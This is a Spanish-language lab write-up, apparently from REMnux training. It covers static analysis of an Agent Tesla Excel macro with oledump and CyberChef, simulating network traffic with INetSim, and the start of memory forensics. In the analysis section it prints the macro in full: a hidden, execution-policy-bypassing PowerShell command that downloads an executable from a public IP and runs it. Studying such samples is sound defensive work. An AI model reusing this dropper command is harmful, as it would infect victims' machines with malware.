REMnux Vm es una distribución especializada de Linux. Incluye herramientas como Volatility, YARA, Wireshark, oledump e INetSim. También proporciona entorno tipo sandbox para diseccionar software potencialmente maliciosos sin comprometer el sistema primario.

## Análisis de Archivos

En este caso, vamos a ver `oledump.py` para conducir análisis estático en un documento potencialmente malicioso Excel.

`oledump.py` es una herramienta de Python que analiza archivos OLE2, comúnmente llamadas Structured Storage or Compound File Binary Format. OLE significa Object Linking and Embedding, una tecnología propietaria desarrollada por Microsoft. Los archivos OLE2 típicamente solían guardar múltiples tipos de datos, como documentos, hojas de cálculo, presentaciones, dentro de un archivo. Esta herramienta es útil para extraer y examinar los contenidos de los archivos OLE2, conviertiéndolo en un recurso valioso para análisis forense y detección de malware.

### Ejemplo 

```bash
ubuntu@10.64.151.152:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm
A: xl/vbaProject.bin
	A1:    468 'PROJECT' 
	A2:    62 'PROJECTwm' 
	A3: m  169 'VBA/Sheet1' 
	A4: M  688 'VBA/ThisWorkbook' 
	A5:    7 'VBA/_VBA_PROJECT' 
	A6:    209 'VBA/dir'
```

Basado en el análisis de archivos de OleDump, un scirpt VBA podría estar embebido en el documento y encontrado dentro de `xl/vbaProject.bin`. Por lo tanto, oledump va a asignarlo a un índice A, aunque puede variar. 

El A (índice) + Numeros son llamados data streams.

Ahora bien, debemos tener en cuenta el flujo de datos con la letra M mayúscula. Esto significa que hay una Macro, y es posible que desee consultar este flujo de datos, 'VBA/ThisWorkbook'.

Vamos a comprobarlo ejecutando el comando `oledump.py agenttsla.xlsm -s 4`. Este comando va a ejecutar oledump y verá el data stream de interés usando el parámetro `-s 4`, donde el parámetro `-s` es la abreviatura de `-select` y el número cuatro (`4`) porque el flujo de datos de interés está en el cuarto lugar (`A4: M 688 'VBA/ThisWorkbook`).

Los resultados se muestran en formato hex dump.  Por lo tanto, vamos a usar el parámetro `--vbadecompress` en adición al comando previo. Este parámetro hace que oledump descomprima cualquier macro VBA comprimido que encuentre a un formato legible.

```bash
ubuntu@10.67.151.152:~/Desktop/tasks/agenttesla oledump.py agenttesla.xlsm -s 4 --vbadecompress
```

Resultado:

```bash
Attribute VB_Name = "ThisWorkbook" 
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}" Attribute VB_GlobalNameSpace = False 
Attribute VB_Creatable = False 
Attribute VB_PredeclaredId = True 
Attribute VB_Exposed = False 
Attribute VB_TemplateDerived = False 
Attribute VB_Customizable = True 
Private Sub Workbook_Open() 
Dim Sqtnew As String, sOutput As String 
Dim Mggcbnuad As Object, MggcbnuadExec As Object 
Sqtnew = "^p*o^*w*e*r*s^^*h*e*l^*l* *^-*W*i*n*^d*o*w^*S*t*y*^l*e* *h*i*^d*d*^e*n^* *-*e*x*^e*c*u*t*^i*o*n*pol^icy* *b*yp^^ass*;* $TempFile* *=* *[*I*O*.*P*a*t*h*]*::GetTem*pFile*Name() | Ren^ame-It^em -NewName { $_ -replace 'tmp$', 'exe' } Pass*Thru; In^vo*ke-We^bRe*quest -U^ri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -Out*File $TempFile; St*art-Proce*ss $TempFile;" 
Sqtnew = Replace(Sqtnew, "*", "") 
Sqtnew = Replace(Sqtnew, "^", "") 
Set Mggcbnuad = CreateObject("WScript.Shell") 
Set MggcbnuadExec = Mggcbnuad.Exec(Sqtnew)

```

Ahora, no es necesario que seamos capaces de leer el script completo, pero si familiarizarlos con algunos carácteres y comandos. En este caso nuestro interés estaría en el valor Sqtnew, por que si vemos el script, hay una IP pública, un PDF, y un .exe dentro.

Vamos a copiar el primer valor de Sqtnew en el área input de [[CyberChef]]. 

A continuación, seleccionar la operación Find/Replace dos veces. Viendo el script, podemos ver que el valor 2 y 3 de Sqtnew tienen un comando para reemplazar * con "" y ^ con "". Podríamos asumir que "" significa que no hay valor. Así pues, con nuestra primera operación seleccionada, pusimos el valor * y seleccionamos SIMPLE STRING como parámetros adicionales. Por el contrario, no pusimos nada en el cuadro Reemplazar ni tuvimos ningún valor. Lo mismo ocurre con nuestra segunda operación: introducimos el valor ^ y seleccionamos SIMPLE STRING, y el cuadro de reemplazo queda vacío. Vea la imagen a continuación.

![[Pasted image 20260422175228.png]]

Este sería el output:

```bash
"powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' } PassThru; Invoke-WebRequest -Uri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -OutFile $TempFile; Start-Process $TempFile;"
```

Vamos a desglosarlo

* Entonces, en PowerShell, ejecutar el parámetro `-WindowStyle` permite controlar cómo la ventana PowerShell aparece cuando ejecutamos un comando o script. En este caso, `hidden` singnifica que la ventana PowerShell no va a ser visible para el usuario.
* Por defecto, PowerShell restringe la ejecución de scripts por razones de seguridad. El parámetro `-executionpolicy` permite sobreescribir esta política. `bypass` significa que la política de ejecución es temporalmente ignorada, permitiendo cualquier script ejecutarse sin restricción.
* El `Invoke-WebRequest` es comúnmente usado para descargar archivos de Internet:
	* `-Uri` especifica la URL del recurso web que quieres recuperar. En nuestro caso, el script está descargando el recurso `Doc-373722pdf.exe` desde `http://193.203.203.67/rt/`.
	* `-OutFile` especifica el archivo local donde el contenido descargado va a ser guardado. En este caso, el archivo `Doc-3737122pdf.exe` va a ser guardado en `$TempFile`.
* `Start-Process` es usado para ejecutar el archivo descargado que está almacenado en `$TempFile` después de la petición web.

En resumen, cuando el documento `agenttesla.xlsm`es abierto, se ejecuta un Macro, este Macro contiene un script VBA. Este script va a ejecutarse y va a ejecutar PowerShell para descargar un archivo llamado `Doc-3737122pdf.exe` desde `http://193.203.203.67/rt/`, lo guarda en una variable $TempFile, luego ejecuta el archivo dentro de esta variable, el cual es un binario o un .exe.

## Fake Network to Aid Analysis

Durante el análisis dinámico, es esencial observar el comportamiento del software potencialmente malicioso, especialmente sus actividades de red. Hay muchos acercamientos a esto. Podemos crear una infraestructura entera, un entorno virtual con diferentes máquinas core, y más. Alternativamente, hay una herramienta dentro de REMnux VM llamada INetSim: Internet Services Simulation Suite.

### INetSim

Si vamos a usar dos máquinas separadas, es importante cambiar el archivo `/etc/inetsim/inetsim.conf/` desde REMnux y en la línea `#dns_default_ip 0.0.0.0` sacar el # y colocar la ip de la segunda máquina virtual.

Luego, ejecutamos `sudo inetsim`

Desde la segunda máquina, nos dirigimos a la dirección IP de REMnux en `https://10.67.151.152`. Va a mostrar un mensaje de Security Risk, ignóralo y haz clic en Advance y luego Accept the Risk and Continue.

Un comportamiento usual de los malware es descargar otro binario o script. Podemos intentar copar este comportamiento al obtener otro archivo de INetSim. Podemos hacerlo via CLI o buscador.

En CLI sería el comando `sudo wget https://10.67.151.152/second_payload.zip --no-check-certificate`.

Al intentar ejecutar el archivo descargado, se direcciona a la homepage de INetSim. 

Lo que hicimos fue copiar el comportamiento de un malware, donde se intenta alcanzar un servidor o URL y luego descargar un archivo secundario que podría tener otro malware.

### Connection Report

Finalmente, al volver a REMnux VM y parar INetSim, por defecto se crea un reporte de las conexiones capturadas. Estas usualmente se guardan en `/var/log/inetsim/report/`. Deberías ver algo asi:

```bash
ubuntu@ip-10-67-151-152:~/Desktop/tasks/agenttesla$ sudo cat /var/log/inetsim/report/report.2233.txt 
=== Report for session '2233' ===

Real start date            : 2026-04-22 21:18:18
Simulated start date       : 2026-04-22 21:18:18
Time difference on startup : none

2026-04-22 21:21:11  First simulated date in log file
2026-04-22 21:21:11  HTTPS connection, method: GET, URL: https://10.67.151.152/, file name: /var/lib/inetsim/http/fakefiles/sample.html
2026-04-22 21:21:11  HTTPS connection, method: GET, URL: https://10.67.151.152/favicon.ico, file name: /var/lib/inetsim/http/fakefiles/favicon.ico
2026-04-22 21:24:53  HTTPS connection, method: GET, URL: https://10.67.151.152/second_payload.ps1, file name: /var/lib/inetsim/http/fakefiles/sample.html
2026-04-22 21:24:53  Last simulated date in log file

===

```

Estos son los registros de cuando la herramienta se estaba ejecutando. Podemos ver conexiones hechas a la URL, el protocolo, y el método que está usando. Tambien podemos ver que el archivo falso fue descargado.

## Memory Investigation: Evidence Preprocessing

Una de las prácticas investigativas más comunes en Digital Forensics es el preprocesamiento de evidencia. Esto involucra ejecutar herramientas y guardar los resultados en texto o formato JSON. El analista a menudo depende de herramientas como Volatility cuando lidia con imágenes de memoria como evidencia. Esta herramienta también está incluida en REMnux VM. 

Los comandos de Volatility son ejecutados para identificar y extraer artefactos específicos de imágenes de memoria, y el resultado de la salida puede ser guardada en archivos de texto para examinación.

### Preprocessing con Volatility

